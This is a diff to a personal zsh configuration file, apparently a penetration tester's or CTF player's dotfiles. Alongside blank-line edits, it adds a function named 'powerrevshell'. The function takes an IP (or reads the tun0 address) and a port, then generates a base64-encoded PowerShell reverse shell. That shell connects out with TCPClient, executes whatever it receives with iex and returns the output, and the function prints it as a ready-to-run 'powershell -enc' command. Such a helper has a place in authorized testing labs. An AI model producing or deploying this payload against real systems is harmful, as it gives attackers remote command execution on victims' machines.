@@ -38,6 +38,7 @@ zstyle ':completion:*' verbose true
 zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
 zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'
 
+
 ####################
 ## Custom Aliases ##
 ####################
@@ -64,6 +65,7 @@ alias icat='kitten icat'
 # grep colored output
 alias grep='grep --color=auto'
 
+
 ####################
 ## Custom binds   ##
 ####################
@@ -71,6 +73,7 @@ alias grep='grep --color=auto'
 bindkey "^[[3~" delete-char
 bindkey '^[[5~' history-beginning-search-backward
 bindkey '^[[6~' history-beginning-search-forward
+
 
 ######################
 ## Custom functions ##
@@ -96,6 +99,39 @@ function extractPorts(){
     echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
     cat extractPorts.tmp; rm extractPorts.tmp
 }
+
+function powerrevshell(){
+  #Colours
+  greenColour="\e[0;32m\033[1m"
+  endColour="\033[0m\e[0m"
+  redColour="\e[0;31m\033[1m"
+  blueColour="\e[0;34m\033[1m"
+  yellowColour="\e[0;33m\033[1m"
+  purpleColour="\e[0;35m\033[1m"
+  turquoiseColour="\e[0;36m\033[1m"
+  grayColour="\e[0;37m\033[1m"
+
+  if [[ $# -eq 2 ]]; then
+    ip=$1
+    port=$2
+  else
+    ip=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d '/' -f1)
+    port="$1"
+    echo -e "\n${yellowColour}[+]${endColour} ${blueColour}IP address fo tun0:${endColour} ${purpleColour}$ip${endColour}"
+  fi
+
+
+  echo -e "\n${yellowColour}[+]${endColour} ${blueColour}Creating RevShell using IP:${endColour}${purpleColour} $ip${endColour} ${blueColour}and Port:${endColour}${purpleColour} $port${endColour}"
+
+  payload=$(pwsh -Command """\$Text = '\$client = New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()'
+  \$Bytes = [System.Text.Encoding]::Unicode.GetBytes(\$Text)
+  \$EncodedText = [Convert]::ToBase64String(\$Bytes)
+  Write-Output \$EncodedText
+  """)
+
+  echo -e "\n${yellowColour}[+]${endColour} ${blueColour}Final Payload:${endColour}\npowershell -enc $payload"
+}
+
 
 # To customize prompt, run `p10k configure` or edit ~/.p10k.zsh.
 [[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh
